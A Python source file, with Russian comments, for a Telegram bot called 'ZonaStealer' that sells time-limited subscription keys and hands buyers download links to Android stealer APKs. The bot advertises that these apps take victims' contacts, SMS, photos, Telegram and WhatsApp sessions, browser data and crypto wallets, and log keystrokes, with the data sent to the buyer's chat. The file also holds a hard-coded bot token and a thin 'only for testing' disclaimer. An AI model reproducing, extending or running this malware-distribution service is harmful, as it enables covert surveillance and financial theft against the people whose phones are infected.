import telebot
from telebot import types
import json
import uuid
import time
import os
from datetime import datetime

TOKEN = '8364189800:AAHHsHHgKZ7oB6XSHExPWn0-0G5Fp8fGNi4'
ADMIN_ID = 7725796090
bot = telebot.TeleBot(TOKEN)

# Файл для базы данных
DB_FILE = 'users.json'

# Загрузка базы
def load_db():
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {'users': {}, 'keys': {}, 'stats': {'builds': 0}}

# Сохранение базы
def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

# ================= ГОТОВЫЕ APK С ТВОИМ ТОКЕНОМ =================
APK_FILES = {
    'basic': 'https://github.com/ZonaStealer/APK/raw/main/stealer_basic.apk',
    'social': 'https://github.com/ZonaStealer/APK/raw/main/stealer_social.apk',
    'full': 'https://github.com/ZonaStealer/APK/raw/main/stealer_full.apk'
}

# ================= КОМАНДЫ =================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = str(message.from_user.id)
    db = load_db()
    
    if user_id == str(ADMIN_ID):
        # АДМИН ПАНЕЛЬ
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔑 Ключ 1 день", callback_data="gen_1"),
            types.InlineKeyboardButton("🔑 7 дней", callback_data="gen_7"),
            types.InlineKeyboardButton("🔑 30 дней", callback_data="gen_30"),
            types.InlineKeyboardButton("📊 Статистика", callback_data="stats"),
            types.InlineKeyboardButton("📦 APK файлы", callback_data="apk_list")
        )
        bot.send_message(message.chat.id, 
            "👑 *Админ панель ZonaStealer*\n\n"
            "Выберите действие:",
            parse_mode='Markdown',
            reply_markup=markup)
    else:
        # ПОЛЬЗОВАТЕЛЬ
        user = db['users'].get(user_id)
        if user and user.get('expiry', 0) > time.time():
            expiry = datetime.fromtimestamp(user['expiry']).strftime('%d.%m.%Y %H:%M')
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("📱 СОЗДАТЬ СТИЛЛЕР", callback_data="build_now"))
            
            bot.send_message(message.chat.id,
                f"✅ *Подписка активна до {expiry}*\n\n"
                f"Нажмите кнопку ниже, чтобы создать стиллер:",
                parse_mode='Markdown',
                reply_markup=markup)
        else:
            bot.send_message(message.chat.id,
                "❌ *Нет активной подписки*\n\n"
                "Введите ключ доступа (12 символов):",
                parse_mode='Markdown')

# ================= СОЗДАНИЕ КЛЮЧЕЙ =================
@bot.callback_query_handler(func=lambda call: call.data.startswith('gen_'))
def create_key(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Только для админа")
        return
    
    days = int(call.data.split('_')[1])
    key = str(uuid.uuid4()).hex[:12].upper()
    
    db = load_db()
    db['keys'][key] = {
        'days': days,
        'created': time.time(),
        'used': False
    }
    save_db(db)
    
    bot.answer_callback_query(call.id, f"✅ Ключ создан")
    bot.send_message(call.message.chat.id,
        f"🔑 *НОВЫЙ КЛЮЧ*\n\n"
        f"`{key}`\n\n"
        f"⏳ Срок: *{days} дней*\n"
        f"📅 Создан: {datetime.now().strftime('%d.%m %H:%M')}\n\n"
        f"Отправьте этот ключ пользователю.",
        parse_mode='Markdown')

# ================= АКТИВАЦИЯ КЛЮЧА =================
@bot.message_handler(func=lambda m: len(m.text) == 12 and m.text.isupper())
def activate_key(message):
    user_id = str(message.from_user.id)
    key = message.text.upper()
    
    db = load_db()
    
    if key in db['keys'] and not db['keys'][key]['used']:
        days = db['keys'][key]['days']
        expiry = time.time() + (days * 86400)
        
        db['users'][user_id] = {
            'expiry': expiry,
            'plan': f'{days} дней',
            'activated': time.time()
        }
        db['keys'][key]['used'] = True
        save_db(db)
        
        expiry_date = datetime.fromtimestamp(expiry).strftime('%d.%m.%Y %H:%M')
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📱 СОЗДАТЬ СТИЛЛЕР", callback_data="build_now"))
        
        bot.send_message(message.chat.id,
            f"✅ *КЛЮЧ АКТИВИРОВАН!*\n\n"
            f"🔑 Ключ: `{key}`\n"
            f"⏳ Срок: {days} дней\n"
            f"📅 Действует до: {expiry_date}\n\n"
            f"*Теперь вы можете создавать стиллеры:*",
            parse_mode='Markdown',
            reply_markup=markup)
        
        # Отправляем инструкцию
        bot.send_message(message.chat.id,
            "📋 *ИНСТРУКЦИЯ:*\n\n"
            "1. Нажмите 'СОЗДАТЬ СТИЛЛЕР'\n"
            "2. Выберите тип APK\n"
            "3. Получите ссылку на скачивание\n"
            "4. Установите APK на устройство\n\n"
            "📱 *Функции стиллера:*\n"
            "• Контакты и SMS\n• Фото и файлы\n• Соцсети\n"
            "• Браузеры\n• Кошельки\n• Кейлоггер\n\n"
            "⚠️ Только для тестирования!",
            parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id,
            "❌ *Неверный или использованный ключ*\n\n"
            "Купить новый ключ: @ZonatTag",
            parse_mode='Markdown')

# ================= СОЗДАНИЕ СТИЛЛЕРА =================
@bot.callback_query_handler(func=lambda call: call.data == 'build_now')
def build_stiller(call):
    user_id = str(call.from_user.id)
    db = load_db()
    
    user = db['users'].get(user_id)
    if not user or user['expiry'] < time.time():
        bot.answer_callback_query(call.id, "❌ Нет подписки")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📱 BASIC (контакты, SMS, фото)", callback_data="apk_basic"),
        types.InlineKeyboardButton("🔥 SOCIAL (Telegram, WhatsApp)", callback_data="apk_social"),
        types.InlineKeyboardButton("💀 FULL (ВСЁ + кейлоггер)", callback_data="apk_full")
    )
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="📱 *ВЫБЕРИТЕ ТИП СТИЛЛЕРА:*\n\n"
             "• *BASIC*: Контакты, SMS, фото, файлы\n"
             "• *SOCIAL*: Соцсети (Telegram, WhatsApp)\n"
             "• *FULL*: Всё + кейлоггер + браузеры + кошельки\n\n"
             "Выберите вариант:",
        parse_mode='Markdown',
        reply_markup=markup)

# ================= ВЫДАЧА APK =================
@bot.callback_query_handler(func=lambda call: call.data.startswith('apk_'))
def send_apk(call):
    user_id = str(call.from_user.id)
    db = load_db()
    
    user = db['users'].get(user_id)
    if not user or user['expiry'] < time.time():
        bot.answer_callback_query(call.id, "❌ Нет подписки")
        return
    
    apk_type = call.data.split('_')[1]
    
    # Выбираем APK
    if apk_type == 'basic':
        apk_url = APK_FILES['basic']
        description = "📱 *BASIC STEALER*\n• Контакты\n• SMS\n• Фото и файлы"
    elif apk_type == 'social':
        apk_url = APK_FILES['social']
        description = "🔥 *SOCIAL STEALER*\n• Telegram сессии\n• WhatsApp чаты\n• Instagram данные"
    else:  # full
        apk_url = APK_FILES['full']
        description = "💀 *FULL STEALER*\n• ВСЕ модули\n• Кейлоггер\n• Браузеры\n• Кошельки"
    
    # Обновляем статистику
    db['stats']['builds'] = db['stats'].get('builds', 0) + 1
    save_db(db)
    
    # Отправляем APK
    bot.answer_callback_query(call.id, "✅ APK готов!")
    
    # Сначала отправляем описание
    bot.send_message(call.message.chat.id,
        f"{description}\n\n"
        f"🔗 *Ссылка для скачивания:*\n"
        f"`{apk_url}`\n\n"
        f"📦 *Инструкция:*\n"
        f"1. Скачайте APK\n"
        f"2. Установите на устройство\n"
        f"3. Данные будут приходить в этот чат\n\n"
        f"⚠️ *ВАЖНО:*\n"
        f"• APK настроен на ваш Telegram ID\n"
        f"• Все данные приходят только вам\n"
        f"• Удалите APK после тестирования",
        parse_mode='Markdown')
    
    # Отправляем файл (если есть прямая ссылка)
    try:
        bot.send_document(call.message.chat.id, apk_url, 
                         caption=f"📦 Стиллер {apk_type.upper()}")
    except:
        pass  # Если не удалось отправить файл, оставляем только ссылку

# ================= СТАТИСТИКА =================
@bot.callback_query_handler(func=lambda call: call.data == 'stats')
def show_stats(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Только для админа")
        return
    
    db = load_db()
    stats = db['stats']
    
    active_users = sum(1 for u in db['users'].values() if u.get('expiry', 0) > time.time())
    unused_keys = sum(1 for k in db['keys'].values() if not k.get('used', False))
    
    text = (
        f"📊 *СТАТИСТИКА СИСТЕМЫ*\n\n"
        f"👥 Пользователей: {len(db['users'])}\n"
        f"✅ Активных: {active_users}\n"
        f"📦 Создано стиллеров: {stats.get('builds', 0)}\n"
        f"🔑 Ключей доступно: {unused_keys}\n\n"
        f"🔄 Бот работает"
    )
    
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, text, parse_mode='Markdown')

# ================= СПИСОК APK =================
@bot.callback_query_handler(func=lambda call: call.data == 'apk_list')
def list_apk(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Только для админа")
        return
    
    text = "📦 *ДОСТУПНЫЕ APK:*\n\n"
    for name, url in APK_FILES.items():
        text += f"• *{name.upper()}*: `{url}`\n"
    
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, text, parse_mode='Markdown')

# ================= ЗАПУСК БОТА =================
if __name__ == '__main__':
    print("=" * 50)
    print("🤖 ZonaStealer Bot запущен")
    print(f"👑 Админ ID: {ADMIN_ID}")
    print(f"🔗 APK файлы готовы: {len(APK_FILES)} шт")
    print("=" * 50)
    
    # Создаем файл базы если нет
    if not os.path.exists(DB_FILE):
        save_db({'users': {}, 'keys': {}, 'stats': {'builds': 0}})
    
    bot.infinity_polling(timeout=30, long_polling_timeout=30)
